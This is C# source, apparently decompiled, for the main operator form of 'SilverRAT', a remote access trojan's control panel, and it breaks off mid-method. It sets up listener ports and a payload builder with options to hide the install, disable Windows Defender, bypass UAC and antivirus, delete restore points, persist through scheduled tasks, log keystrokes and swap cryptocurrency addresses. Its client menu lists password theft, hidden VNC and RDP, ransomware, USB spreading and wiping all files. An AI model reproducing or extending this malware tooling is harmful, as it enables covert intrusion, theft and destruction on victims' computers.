using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using SilverRAT.Algorithm;
using SilverRAT.Connection;
using SilverRAT.Helper;
using SilverRAT.Helper.ReverseProxy;
using SilverRAT.MessagePack;
using SilverRAT.Properties;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Utilities.BunifuPages.BunifuAnimatorNS;

namespace SilverRAT.Forms;

public class FormSilver : Form
{
    public static class Win32
    {
        public const int WM_SETREDRAW = 11;

        [DllImport("user32.dll")]
        public static extern IntPtr SendMessage(IntPtr hWnd, int msg, IntPtr wParam, IntPtr lParam);

        public static void SuspendPainting(IntPtr hWnd)
        {
            SendMessage(hWnd, 11, (IntPtr)0, IntPtr.Zero);
        }

        public static void ResumePainting(IntPtr hWnd)
        {
            SendMessage(hWnd, 11, (IntPtr)1, IntPtr.Zero);
        }
    }

    public List<ProxyPacket> list_1;

    public Random RandomNumber = new Random();

    public bool StateAV = true;

    public string OutputDll = Application.StartupPath + "\\Resources";

    public cGeoMain cGeoMain = new cGeoMain();

    private static PopupNotifier PopupNotifiection = new PopupNotifier();

    private IContainer components = null;

    private Panel panelForm;

    private Guna2CircleButton ButtClose;

    private Guna2CircleButton ButtonMaximized;

    private BunifuPanel PanelBottom;

    private Guna2CircleButton ButtionMinimized;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelRight;

    private BunifuFormDrag FormDragMine;

    private BunifuElipse PanelFormElipse;

    private Guna2ResizeBox FormResizeBox1;

    public Utilities.BunifuPages.BunifuTransition TransitionShowng;

    public Utilities.BunifuPages.BunifuTransition TransitionHiddeng;

    private BunifuLabel TitlePage;

    private Panel PaneControll;

    private Guna2Button ButAbout;

    private Guna2Button ButSettings;

    private Guna2Button ButNotif;

    private Guna2Button ButBuilder;

    private Guna2Button ButClients;

    private Guna2Button ButMonitor;

    private Guna2Button ButDashboard;

    private BunifuIconButton ButtonMune;

    private BunifuLabel bunifuLabel17;

    private BunifuPages PageForm;

    private TabPage Page1;

    private TabPage Page2;

    private Panel PanelDashboard;

    private TabPage Page3;

    private TabPage Page4;

    private TabPage Page5;

    private TabPage Page6;

    private TabPage Page7;

    private Panel PanelMonitor;

    private Panel PanelClients;

    private Panel PanelLogs;

    private Panel PanelBuilder;

    private Panel PanelSettings;

    private Panel PanelAbout;

    private BunifuPanel bunifuPanel1;

    private BunifuLabel TimeME;

    private Guna2RatingStar LeavelDashboard;

    private BunifuLabel UsageCPU;

    private Label MesgWelcome;

    private BunifuLabel bunifuLabel31;

    private PictureBox pictureBox8;

    private BunifuPanel bunifuPanel4;

    private BunifuLabel bunifuLabel_0;

    private BunifuLabel bunifuLabel125;

    private BunifuLabel bunifuLabel126;

    private Bunifu.UI.WinForms.BunifuProgressBar ProgressBarWin11;

    private BunifuPanel bunifuPanel3;

    private BunifuLabel bunifuLabel_1;

    private BunifuLabel bunifuLabel122;

    private BunifuLabel bunifuLabel123;

    private Bunifu.UI.WinForms.BunifuProgressBar ProgressBarWin10;

    private BunifuPanel bunifuPanel2;

    private BunifuLabel CountWin7;

    private BunifuLabel bunifuLabel33;

    private BunifuLabel bunifuLabel120;

    private Bunifu.UI.WinForms.BunifuProgressBar ProgressBarWin7;

    private BunifuPanel bunifuPanel6;

    private BunifuLabel CountWinXP;

    private BunifuLabel bunifuLabel128;

    private BunifuLabel bunifuLabel129;

    private Bunifu.UI.WinForms.BunifuProgressBar ProgressBarWinXP;

    private Guna2PictureBox guna2PictureBox1;

    private Bunifu.UI.WinForms.BunifuGradientPanel bunifuGradientPanel1;

    private Label label5;

    private Label label11;

    private Label CountClients;

    private BunifuLabel CountDesconnect;

    private BunifuLabel CountNewClient;

    private Label label8;

    private Guna2Button guna2Button5;

    private Guna2Button guna2Button6;

    private BunifuLabel bunifuLabel16;

    private BunifuLabel bunifuLabel35;

    private BunifuPanel bunifuPanel5;

    private BunifuLabel CountSessionMonitor;

    private Guna2GradientButton guna2GradientButton_0;

    private Label label3;

    private BunifuPanel bunifuPanel11;

    private BunifuLabel CountGrabber;

    private Guna2GradientButton guna2GradientButton_1;

    private Label label4;

    private Bunifu.UI.WinForms.BunifuGradientPanel bunifuGradientPanel3;

    private PictureBox pictureBox9;

    private BunifuLabel CountReceivedData;

    private Guna2CircleProgressBar ProgressBarReceivedData;

    private BunifuLabel bunifuLabel95;

    private BunifuLabel CountSentData;

    private Guna2CircleProgressBar ProgressBarDataSent;

    private BunifuLabel bunifuLabel14;

    private Bunifu.UI.WinForms.BunifuGradientPanel bunifuGradientPanel2;

    private Label label6;

    private Bunifu.UI.WinForms.BunifuSeparator bunifuSeparator3;

    public Guna2DataGridView ListDashboard;

    private DataGridViewImageColumn dataGridViewImageColumn1;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn1;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn6;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn8;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn13;

    private BunifuShadowPanel PanelListClient;

    private Bunifu.UI.WinForms.BunifuSeparator bunifuSeparator2;

    private BunifuLabel InfoListClients;

    private BunifuTextBox SearchListClient;

    public Guna2DataGridView ClientsList;

    private BunifuShadowPanel bunifuShadowPanel5;

    private Bunifu.UI.WinForms.BunifuSeparator bunifuSeparator4;

    private BunifuLabel bunifuLabel54;

    public Guna2DataGridView LogsList;

    private DataGridViewImageColumn Column15;

    private DataGridViewTextBoxColumn Column16;

    private DataGridViewTextBoxColumn Column17;

    private BunifuShadowPanel bunifuShadowPanel1;

    private BunifuCheckBox BuilderDelayConnect;

    private Bunifu.UI.WinForms.BunifuSeparator bunifuSeparator1;

    private Label TxDelay;

    private BunifuTextBox BuilderKey;

    private BunifuTextBox BuilderGroup;

    private BunifuTextBox BuilderHost;

    private BunifuTextBox BuilderPort;

    private BunifuTextBox BuilderReconnectDelay;

    private BunifuTextBox BuilderProcessMutex;

    private BunifuCheckBox BuilderInstallation;

    private Label TxInstall;

    private BunifuCheckBox BuilderCreateTask;

    private Label TxTask;

    private BunifuCheckBox BuilderDefender;

    private Label TxWD;

    private BunifuCheckBox bunifuCheckBox_0;

    private Label TxUAC;

    private Bunifu.UI.WinForms.BunifuDropdown ComDownTasks;

    private BunifuRadioButton HostDefault;

    private BunifuRadioButton HostHtml;

    private Label TxHtml;

    private Label TxDefault;

    private BunifuTextBox Foldername;

    private BunifuCheckBox DeleteSystemRestore;

    private Label TxRestore;

    private Panel InsPanel;

    private Label TxTemplates;

    private BunifuRadioButton BuilderTemplates;

    private Label TxApplacation;

    private BunifuRadioButton BuilderApplicationData;

    private Label TxUserProfil;

    private BunifuRadioButton BuilderUserProfile;

    private BunifuTextBox BuilderProcessName;

    private BunifuCheckBox BuilderBloackAccessPath;

    private Label TxBlockPath;

    private BunifuCheckBox BuilderHiddenInstall;

    private Label TxHiddenInstall;

    private BunifuCheckBox AutoStartup;

    private Label TxStartup;

    private BunifuCheckBox HiddenProcess;

    private Label TxHiddenProcess;

    private BunifuCheckBox BuilderDelay;

    private Label TxExDelay;

    private PictureBox pictureBox1;

    private PictureBox pictureBox4;

    private BunifuLabel bunifuLabel1;

    private Guna2GradientButton Build;

    private BunifuLabel bunifuLabel5;

    private BunifuCheckBox EnableFlag;

    private Label TxFlag;

    private BunifuCheckBox EnableIP;

    private Label TxIP;

    private BunifuCheckBox EnableID;

    private Label TxID;

    private BunifuCheckBox EnableLogo;

    private Label TxLogo;

    private Label TxMonitors;

    private BunifuCheckBox EnableMonitors;

    private Label TxPings;

    private BunifuCheckBox EnablePings;

    private Label TxWindowsActive;

    private BunifuCheckBox EnableWindowsActive;

    private Label TxCountry;

    private BunifuCheckBox EnableCountry;

    private BunifuShadowPanel bunifuShadowPanel4;

    private Bunifu.UI.WinForms.BunifuDropdown CurvatureProperties;

    private Bunifu.UI.WinForms.BunifuDropdown TransitionSpeed;

    private Bunifu.UI.WinForms.BunifuDropdown TransitionOut;

    private Bunifu.UI.WinForms.BunifuDropdown TransitionLogin;

    private BunifuLabel bunifuLabel6;

    private BunifuCheckBox EdgecurvatureForm;

    private Label label1;

    private BunifuShadowPanel bunifuShadowPanel2;

    private BunifuLabel bunifuLabel4;

    private BunifuTextBox TextSocketPort;

    private BunifuLabel CountPort;

    private Guna2DataGridView ListSocketPort;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn3;

    private Label label10;

    private Label label9;

    private Label label7;

    private BunifuLabel CountScroolForm;

    private Guna2TrackBar CurvatureFormTrackBar;

    private Guna2GradientButton StartPort;

    private PictureBox pictureBox5;

    private BunifuTextBox TextMessageNotif;

    private BunifuTextBox TextTitleNotif;

    private BunifuTextBox TextDelayNotif;

    private BunifuTextBox SpeedNotif;

    private Label label12;

    private BunifuCheckBox ShowIconNotif;

    private Label label14;

    private BunifuCheckBox ScrollToOutNotif;

    private Label label13;

    private BunifuCheckBox ShowCloseButtNotif;

    private Label label15;

    private BunifuCheckBox EffectNotif;

    private BunifuLabel bunifuLabel7;

    private PictureBox pictureBox6;

    private Bunifu.UI.WinForms.BunifuSeparator bunifuSeparator5;

    private PictureBox pictureBox7;

    private Guna2GradientButton SaveSetting;

    private Panel MunePanelProfile;

    private Panel PanelProfile;

    private Panel PanelMuneBuilder;

    private Panel PanelMuneMonitor;

    private BunifuTextBox ScanTitle;

    private Label label17;

    private BunifuCheckBox ScanActiveAddresses;

    private BunifuTextBox TextLTC;

    private BunifuTextBox TextETH;

    private BunifuTextBox TextBTC;

    private PictureBox pictureBox11;

    private BunifuCheckBox TlogCurrencyGrabber;

    private Label label16;

    private BunifuTextBox Payloadname;

    private Label label26;

    private Guna2GradientButton SaveProperties;

    private BunifuCheckBox SaveSettings;

    private Guna2GradientButton BrowserIcon;

    private BunifuCheckBox BuilderChackIcon;

    private Label label25;

    private BunifuDatePicker bunifuDatePicker1;

    private BunifuCheckBox BuilderDatemodified;

    private Label label24;

    private Guna2GradientButton guna2GradientButton_2;

    private BunifuTextBox Vr4;

    private BunifuTextBox Vr3;

    private BunifuTextBox Vr2;

    private BunifuTextBox Vr1;

    private BunifuTextBox BuilderTrademarksAssembly;

    private BunifuTextBox BuilderCompanyAssembly;

    private BunifuTextBox BuilderCopyrightAssembly;

    private BunifuTextBox BuilderDescriptionsAssembly;

    private BunifuCheckBox BuilderAssemblyinformation;

    private Label label23;

    private BunifuTextBox BuilderTitleAssembly;

    private Label label22;

    private BunifuRadioButton SCR;

    private Label label20;

    private Label label21;

    private BunifuRadioButton CMD;

    private BunifuRadioButton PIF;

    private Label label18;

    private Label label19;

    private BunifuRadioButton EXE;

    private BunifuRadioButton COM;

    private BunifuLabel NameIcon;

    private BunifuPictureBox ImageIcon;

    private BunifuPanel bunifuPanel19;

    private Guna2Button guna2Button3;

    private Guna2Button guna2Button2;

    private Guna2Button guna2Button1;

    private BunifuLabel bunifuLabel74;

    private BunifuLabel bunifuLabel67;

    private BunifuLabel ValueMunePerformince;

    private BunifuLabel bunifuLabel71;

    private BunifuLabel ProfileDate;

    private Guna2GradientButton BrowserLogo;

    private Guna2RatingStar LevelProfile;

    private BunifuLabel bunifuLabel_2;

    private BunifuLabel ProfileUsername;

    private Guna2CircleProgressBar ImageProfileMune;

    private Guna2CircleButton guna2CircleButton_0;

    private BunifuLabel TitleMuneBuilder;

    private Label MuneCloseBuilder;

    public ImageList IconLogs;

    public ImageList Flag;

    private BunifuCheckBox BaypassAV;

    private Label label28;

    private Panel PanelDelay;

    private BunifuTextBox BuilderExcutionDelay;

    private Panel PanelReDelay;

    private Panel PanelTask;

    private System.Windows.Forms.Timer TimerDashboard;

    private Guna2GradientButton TestNotif;

    private Guna2GradientButton SaveMonitorData;

    private Panel PanelAssemplyInfo;

    private Panel PanelListScan;

    private Panel PanelMonitorGrabber;

    private Panel PanelBrowserIcon;

    private Utilities.BunifuPages.BunifuTransition bunifuTransition1;

    private Panel PanelButtonPort;

    private Panel PanelResizeForm;

    private BunifuCheckBox keyloggerOfflien;

    private Label TxkeyloggerOfflien;

    private BunifuPages TabMune;

    private TabPage tabPage1Builder;

    private TabPage tabPage2Monitor;

    private TabPage tabPage3;

    private BunifuShadowPanel bunifuShadowPanel3;

    private Bunifu.UI.WinForms.BunifuSeparator bunifuSeparator6;

    private BunifuLabel bunifuLabel8;

    private LinkLabel ClaerListMonitor;

    private BunifuLabel InfoMonitorCounts;

    public Guna2DataGridView LogsMonitor;

    private Label CloseMuneMonitor;

    private BunifuLabel TitleMuneProfile;

    private Label MuneCloseProfile;

    private LinkLabel ClearListLogs;

    private DataGridViewImageColumn CLogo;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn_0;

    private DataGridViewTextBoxColumn CID;

    private DataGridViewTextBoxColumn CIP;

    private DataGridViewTextBoxColumn CPort;

    private DataGridViewImageColumn CFlag;

    private DataGridViewTextBoxColumn CCountry;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn_1;

    private DataGridViewImageColumn CAdmin;

    private DataGridViewTextBoxColumn CSystem;

    private DataGridViewTextBoxColumn CDate;

    private DataGridViewTextBoxColumn Column1;

    private DataGridViewTextBoxColumn CVersion;

    private DataGridViewTextBoxColumn CPing;

    private DataGridViewTextBoxColumn CActive;

    private DataGridViewImageColumn dataGridViewImageColumn2;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn2;

    private DataGridViewTextBoxColumn Column3;

    private DataGridViewTextBoxColumn Column2;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn4;

    private Label label30;

    private Label label29;

    private BunifuTextBox DelayMonitor;

    public Guna2DataGridView ListScanActiveAddresses;

    private DataGridViewTextBoxColumn Column4;

    private TabPage PageSocketPort;

    private ContextMenuStrip ContexClients;

    private ToolStripMenuItem ManagerContex;

    private ToolStripSeparator toolStripSeparator1;

    private ToolStripMenuItem RemoteDesktopContex;

    private ToolStripMenuItem RemoteWindowsActiveContex;

    private ToolStripMenuItem RemoteMicrophoneContex;

    private ToolStripMenuItem RemoteKeyloaggerContex;

    private ToolStripMenuItem RemoteCameraContex;

    private ToolStripMenuItem RemoteChatContex;

    private ToolStripSeparator toolStripSeparator2;

    private ToolStripMenuItem HiddenVNCContex;

    private ToolStripMenuItem HiddenApplactionsContex;

    private ToolStripMenuItem HiddenBrowserContex;

    private ToolStripMenuItem HiddenRDPContex;

    private ToolStripSeparator toolStripSeparator3;

    private ToolStripMenuItem ReverseProxyContex;

    private ToolStripMenuItem InternetSpeedContex;

    private ToolStripSeparator toolStripSeparator4;

    private ToolStripMenuItem PasswordsContex;

    private ToolStripMenuItem MonitorsContex;

    private ToolStripMenuItem MonitorStartContex;

    private ToolStripMenuItem MonitorStopContex;

    private ToolStripMenuItem systemToolStripMenuItem;

    private ToolStripMenuItem SystemLogoffContex;

    private ToolStripMenuItem SystemRestartContex;

    private ToolStripMenuItem SystemShutdownContex;

    private ToolStripMenuItem extraToolStripMenuItem1;

    private ToolStripMenuItem RansomwareContex;

    private ToolStripMenuItem USBSpreadContex;

    private ToolStripMenuItem VisitWebsiteContex;

    private ToolStripSeparator toolStripSeparator5;

    private ToolStripMenuItem clientToolStripMenuItem1;

    private ToolStripMenuItem ChagneLogoClientContex;

    private ToolStripMenuItem RenameClientContex;

    private ToolStripMenuItem UpdateClientContex;

    private ToolStripMenuItem RestartClientContex;

    private ToolStripMenuItem CloseClientContex;

    private ToolStripMenuItem UnistallClientContex;

    private ToolStripMenuItem sendFileToolStripMenuItem;

    private ToolStripMenuItem SendFileToMemoryContex;

    private ToolStripMenuItem SendFileToDiskContex;

    private ToolStripMenuItem folderToolStripMenuItem;

    private ToolStripMenuItem OpenFolderDownloads;

    private ToolStripMenuItem OpenFolderPasswords;

    private ToolStripMenuItem OpenFolderKeyloagger;

    private ToolStripMenuItem SystemHangContex;

    private ToolStripMenuItem DeleteCookiesContex;

    private ToolStripMenuItem DeleteSystemRestoreContex;

    private ToolStripMenuItem SendFileFromURLContex;

    private ToolStripMenuItem toolStripMenuItem_0;

    private ToolStripMenuItem DeleteAllFilesContex;

    private ToolStripMenuItem OptionsContex;

    private PictureBox pictureBox3;

    private PictureBox pictureBox2;

    private PerformanceCounter performanceCounter1;

    private PictureBox ImageBypassAV;

    private BunifuLabel InfoBypassAV;

    private PerformanceCounter performanceCounter2;

    private PictureBox ImageMuneError;

    private PictureBox ImageMuneGood;

    private BunifuCheckBox EnabledDiscord;

    private Label label2;

    private BunifuTextBox bunifuTextBox_0;

    private BunifuCheckBox EnabledRecoveryData;

    private Label LabelRecoveryData;
    private DataGridViewTextBoxColumn CNickname;
    private DataGridViewTextBoxColumn CUsername;
    private BunifuLabel TitleMuneMonitor;

    public string StupProgram { get; set; }

    public string StupSetup { get; set; }

    public string StupMain { get; set; }

    private bool Trans { get; set; }

    public string BuilderIconPath { get; set; }

    public string OutputPayload { get; set; }

    public string UrlAV { get; set; }

    public FormSilver()
    {
        InitializeComponent();
        Flag = cGeoMain.cImageList;
        list_1 = new List<ProxyPacket>();
        PageForm.SelectedIndex = 7;
    }

    private async void FormSilver_Load(object sender, EventArgs e)
    {
        Methods.SetDoubleBuffered(this);
        ReadPorts();
        ReadNotifSetting();
        ReadProfilBuilder();
        ReadProfilMonitor();
        ReadSettingData();
        ListviewDoubleBuffer.EnableDataGridView(ClientsList);
        ListviewDoubleBuffer.EnableDataGridView(LogsList);
        ListviewDoubleBuffer.EnableDataGridView(ListDashboard);
        Settings.ServerCertificate = new X509Certificate2(Settings.CertificatePath);
        if (!Directory.Exists(Settings.PathLogo))
        {
            Directory.CreateDirectory(Settings.PathLogo);
        }
        await Methods.FadeIn(this, 5);
        Trans = true;
        try
        {
            Console.WriteLine("Welcome : " + Logger.auth_sample.user_data.username);
        }
        catch
        {
            Close();
        }
    }

    private void FormSilver_Shown(object sender, EventArgs e)
    {
        TransitionShowng.ShowSync(panelForm);
        MinimumSize = base.Size;
        Methods.MinimizeFootprint();
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void FormSilver_Activated(object sender, EventArgs e)
    {
        if (Trans)
        {
            base.Opacity = 1.0;
        }
    }

    private void FormSilver_Deactivate(object sender, EventArgs e)
    {
        base.Opacity = 0.97;
    }

    private void FormSilver_ResizeBegin(object sender, EventArgs e)
    {
        PanelResizeForm.SuspendLayout();
    }

    private void FormSilver_ResizeEnd(object sender, EventArgs e)
    {
        Win32.SuspendPainting(PanelResizeForm.Handle);
        PanelResizeForm.ResumeLayout();
        Win32.ResumePainting(PanelResizeForm.Handle);
        Refresh();
    }

    private void TextSocketPort_KeyPress(object sender, KeyPressEventArgs e)
    {
        if (!char.IsNumber(e.KeyChar) & !char.IsControl(e.KeyChar))
        {
            e.Handled = true;
        }
    }

    private void TextSocketPort_OnIconLeftClick(object sender, EventArgs e)
    {
        try
        {
            foreach (DataGridViewRow selectedRow in ListSocketPort.SelectedRows)
            {
                ListSocketPort.Rows.Remove(selectedRow);
            }
        }
        catch
        {
        }
    }

    private void TextSocketPort_OnIconRightClick(object sender, EventArgs e)
    {
        if (StartPort.Text == "Connected")
        {
            return;
        }
        if (TextSocketPort.Text.Length == 0)
        {
            Notifiecation.Show("Open Port!", "Please enter Port", Resources.Alert, Color.FromArgb(248, 189, 9));
            return;
        }
        foreach (DataGridViewRow item in (IEnumerable)ListSocketPort.Rows)
        {
            if (!item.IsNewRow && TextSocketPort.Text == item.Cells[0].Value.ToString())
            {
                Notifiecation.Show("Open Port!", "This port is already added", Resources.InfoNotif, Color.FromArgb(52, 152, 219));
                return;
            }
        }
        ListSocketPort.Rows.Add(TextSocketPort.Text);
        TextSocketPort.Clear();
    }

    private void ReadPorts()
    {
        try
        {
            Profile profile = new Profile("SocketPort");
            string[] array = profile.SocketPort.Split(',');
            string[] array2 = array;
            foreach (string text in array2)
            {
                if (text.ToString().Length > 0)
                {
                    ListSocketPort.Rows.Add(text.ToString());
                }
            }
        }
        catch
        {
        }
    }

    private void StartPort_Click(object sender, EventArgs e)
    {
        try
        {
            if (!Methods.InternetState())
            {
                MessageBox.Show(this, "Please check internet connection!", "SilverRAT | Connect!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }
        }
        catch
        {
        }
        try
        {
            TcpListener tcpListener = null;
            Settings.PortTcpProxy = RandomNumber.Next(6000, 10000);
            try
            {
                tcpListener = new TcpListener(IPAddress.Any, Settings.PortTcpProxy);
                tcpListener.Start();
            }
            catch
            {
                Notifiecation.Show("Open Port!", "The socket is busy now, try again!", Resources.Alert, Color.FromArgb(248, 189, 9));
                return;
            }
            ProxyPacket proxyPacket = new ProxyPacket();
            proxyPacket.Method_0(Settings.PortTcpProxy, 0, tcpListener);
            list_1.Add(proxyPacket);
            Settings.PortTcpProxy = Settings.PortTcpProxy;
            Settings.IsConnectedProxy = true;
        }
        catch (Exception ex)
        {
            Notifiecation.Show("Socket!", ex.Message, Resources.Alert, Color.FromArgb(248, 189, 9));
            return;
        }
        if (ListSocketPort.Rows.Count == 0)
        {
            Notifiecation.Show("Open Port!", "Please Add Port into list", Resources.Alert, Color.FromArgb(248, 189, 9));
            return;
        }
        TextSocketPort.Enabled = false;
        PanelButtonPort.Enabled = false;
        StartPort.Text = "Connection..";
        try
        {
            string text = string.Empty;
            foreach (DataGridViewRow item in (IEnumerable)ListSocketPort.Rows)
            {
                if (!item.IsNewRow)
                {
                    text = text + item.Cells[0].Value.ToString() + ",";
                }
            }
            Connect(text);
        }
        catch (Exception ex2)
        {
            Notifiecation.Show("Open Port!", ex2.Message, Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
            TextSocketPort.Enabled = true;
            PanelButtonPort.Enabled = true;
            StartPort.Text = "Connect";
        }
    }

    private async void Connect(string ListPort)
    {
        try
        {
            int countport = 0;
            await Task.Delay(1000);
            string[] ports = ListPort.Split(',');
            string[] array = ports;
            foreach (string port in array)
            {
                if (!string.IsNullOrWhiteSpace(port))
                {
                    Listener listener = new Listener();
                    Thread thread = new Thread(listener.Connect)
                    {
                        IsBackground = true
                    };
                    thread.Start(Convert.ToInt32(port.ToString().Trim()));
                    countport++;
                }
            }
            CountPort.Text = countport + " Ports opened successfully";
            TextSocketPort.Enabled = true;
            PanelButtonPort.Enabled = false;
            StartPort.Text = "Connected";
            TimerDashboard.Start();
            PaneControll.Visible = true;
            PageForm.SelectedIndex = 0;

            try
            {
                ProfileUsername.Text = Logger.auth_sample.user_data.username.ToString();
                LevelProfile.Value = Convert.ToInt32(Logger.auth_sample.user_data.level);
                ProfileDate.Text = "Liftime";
                ProfileDate.ForeColor = Color.Green;
                if (ClientsList.SelectedRows.Count == 0)
                {
                    //	ProfileDate.Text = "Liftime";
                    //	ProfileDate.ForeColor = Color.Green;
                }
                else
                {
                    //	ProfileDate.Text = Logger.auth_sample.user_data.expires.ToString();
                    //	ProfileDate.ForeColor = Color.Black;
                }
                bunifuLabel_2.Text = "ID - " + Logger.auth_sample.user_data.id + "Silver_RAT";
            }
            catch
            {
                Close();
            }
            MesgWelcome.Text = "Welcome Back, " + ProfileUsername.Text;
            LeavelDashboard.Value = Convert.ToInt32(Logger.auth_sample.user_data.level);
        }
        catch (Exception ex2)
        {
            Exception ex = ex2;
            Notifiecation.Show("Open Port!", ex.Message, Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
            Environment.Exit(0);
        }
        try
        {
            string PortsRows = string.Empty;
            foreach (DataGridViewRow Row in (IEnumerable)ListSocketPort.Rows)
            {
                if (!Row.IsNewRow)
                {
                    PortsRows = PortsRows + Row.Cells[0].Value.ToString() + ",";
                }
            }
            new Profile("SocketPort").SocketPort = PortsRows;
        }
        catch
        {
        }
    }

    private Clients[] GetSelectedClients()
    {
        List<Clients> clientsList = new List<Clients>();
        Invoke((MethodInvoker)delegate
        {
            lock (Settings.LockListviewClients)
            {
                if (ClientsList.SelectedRows.Count == 0)
                {
                    return;
                }
                foreach (DataGridViewRow selectedRow in ClientsList.SelectedRows)
                {
                    clientsList.Add((Clients)selectedRow.Tag);
                }
            }
        });
        return clientsList.ToArray();
    }

    private void ButDashboard_Click(object sender, EventArgs e)
    {
        if (TimeME.Text.Contains("PM"))
        {
            MesgWelcome.Text = "Good evening, " + ProfileUsername.Text;
        }
        else
        {
            MesgWelcome.Text = "Good morning, " + ProfileUsername.Text;
        }
        try
        {
            if (!Methods.InternetState())
            {
                MessageBox.Show(this, "Please check internet connection!", "SilverRAT | Connect!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                LeavelDashboard.Value = 1f;
            }
            else
            {
                LeavelDashboard.Value = Convert.ToInt32(Logger.auth_sample.user_data.level);
            }
        }
        catch
        {
        }
        if (PageForm.SelectedIndex != 0)
        {
            PageForm.SelectedIndex = 0;
        }
    }

    private void ButMonitor_Click(object sender, EventArgs e)
    {
        if (PageForm.SelectedIndex != 1)
        {
            PageForm.SelectedIndex = 1;
        }
    }

    private void ButClients_Click(object sender, EventArgs e)
    {
        if (PageForm.SelectedIndex != 2)
        {
            PageForm.SelectedIndex = 2;
        }
    }

    private void ButNotif_Click(object sender, EventArgs e)
    {
        if (PageForm.SelectedIndex != 3)
        {
            PageForm.SelectedIndex = 3;
        }
    }

    private void ButBuilder_Click(object sender, EventArgs e)
    {
        if (Convert.ToInt32(Logger.auth_sample.user_data.level) == 5)
        {
            ImageBypassAV.Visible = false;
            InfoBypassAV.Visible = false;
            BaypassAV.Enabled = true;
        }
        else
        {
            BaypassAV.Enabled = false;
            BaypassAV.Checked = false;
            ImageBypassAV.Visible = true;
            InfoBypassAV.Visible = true;
        }
        if (PageForm.SelectedIndex != 4)
        {
            PageForm.SelectedIndex = 4;
        }
    }

    private void ButSettings_Click(object sender, EventArgs e)
    {
        if (PageForm.SelectedIndex != 5)
        {
            PageForm.SelectedIndex = 5;
        }
    }

    private void ButAbout_Click(object sender, EventArgs e)
    {
        if (PageForm.SelectedIndex != 6)
        {
            PageForm.SelectedIndex = 6;
        }
    }

    private void PageForm_Selected(object sender, TabControlEventArgs e)
    {
        if (PageForm.SelectedIndex != 0)
        {
            TransitionHiddeng.HideSync(PanelDashboard);
        }
        if (PageForm.SelectedIndex != 1)
        {
            TransitionHiddeng.HideSync(PanelMonitor);
        }
        if (PageForm.SelectedIndex != 2)
        {
            TransitionHiddeng.HideSync(PanelClients);
        }
        if (PageForm.SelectedIndex != 3)
        {
            TransitionHiddeng.HideSync(PanelLogs);
        }
        if (PageForm.SelectedIndex != 4)
        {
            TransitionHiddeng.HideSync(PanelBuilder);
        }
        if (PageForm.SelectedIndex != 5)
        {
            TransitionHiddeng.HideSync(PanelSettings);
        }
        if (PageForm.SelectedIndex != 6)
        {
            TransitionHiddeng.HideSync(PanelAbout);
        }
    }

    private void PageForm_SelectedIndexChanged(object sender, EventArgs e)
    {
        string text = "Welcome to Silver ";
        if (PageForm.SelectedIndex == 0)
        {
            TransitionShowng.ShowSync(PanelDashboard);
            TitlePage.Text = text + "dashboard";
        }
        if (PageForm.SelectedIndex == 1)
        {
            TransitionShowng.ShowSync(PanelMonitor);
            TitlePage.Text = text + "eye";
        }
        if (PageForm.SelectedIndex == 2)
        {
            TransitionShowng.ShowSync(PanelClients);
            TitlePage.Text = text + "Clients";
        }
        if (PageForm.SelectedIndex == 3)
        {
            TransitionShowng.ShowSync(PanelLogs);
            TitlePage.Text = text + "Logs";
        }
        if (PageForm.SelectedIndex == 4)
        {
            TransitionShowng.ShowSync(PanelBuilder);
            TitlePage.Text = text + "Builder";
        }
        if (PageForm.SelectedIndex == 5)
        {
            TransitionShowng.ShowSync(PanelSettings);
            TitlePage.Text = text + "Settings";
        }
        if (PageForm.SelectedIndex == 6)
        {
            TransitionShowng.ShowSync(PanelAbout);
            TitlePage.Text = text + "About";
        }
        Methods.MinimizeFootprint();
        if (PageForm.SelectedIndex == 1 || PageForm.SelectedIndex == 4)
        {
            ButtonMune.Image = Resources.InfoSetting;
        }
        else
        {
            ButtonMune.Image = Resources.InfoProfile;
        }
    }

    private void MuneClose_Click_1(object sender, EventArgs e)
    {
        TransitionHiddeng.HideSync(MunePanelProfile);
    }

    private void CloseMuneMonitor_Click(object sender, EventArgs e)
    {
        TransitionHiddeng.HideSync(MunePanelProfile);
    }

    private void MuneCloseProfile_Click(object sender, EventArgs e)
    {
        TransitionHiddeng.HideSync(MunePanelProfile);
    }

    private void ButtonMune_Click(object sender, EventArgs e)
    {
        try
        {
            if (!Methods.InternetState())
            {
                MessageBox.Show(this, "Please check internet connection!", "SilverRAT | Connect!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }
        }
        catch
        {
        }
        if (PageForm.SelectedIndex == 1)
        {
            TabMune.SelectedIndex = 1;
            TitleMuneMonitor.Text = "Monitor Settings";
        }
        else if (PageForm.SelectedIndex == 4)
        {
            TabMune.SelectedIndex = 0;
            TitleMuneBuilder.Text = "Builder Settings";
        }
        else
        {
            TabMune.SelectedIndex = 2;
            TitleMuneProfile.Text = "Profile";
            try
            {
                ProfileUsername.Text = Logger.auth_sample.user_data.username.ToString();
                LevelProfile.Value = Convert.ToInt32(Logger.auth_sample.user_data.level);
                if (Logger.auth_sample.user_data.expires.ToString().Contains("2030"))
                {
                    ProfileDate.Text = "Liftime";
